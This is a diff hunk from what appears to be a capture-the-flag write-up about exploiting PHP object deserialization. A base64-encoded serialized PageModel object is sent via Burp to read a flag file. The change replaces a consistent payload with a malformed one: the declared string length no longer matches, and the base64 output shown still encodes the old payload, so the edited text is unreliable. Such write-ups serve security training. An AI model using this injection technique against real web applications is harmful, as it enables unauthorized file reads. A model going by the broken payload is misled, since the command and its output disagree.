@@ -113,7 +113,7 @@ www
 
 Let's modify our payload again to get the content of that dir:  
 ```console
-echo 'O:9:"PageModel":1:{s:4:"file";s:11:"/flag_Sz1aU";}' | base64
+echo 'O:9:"PageModel":1:{s:4:"file";s:16:"cat /flag_Sz1aU";}' | base64
 Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfU3oxYVUiO30K
 ```  
 Let's submit this via burp and here it is, we can see our flag is returned by the server!  
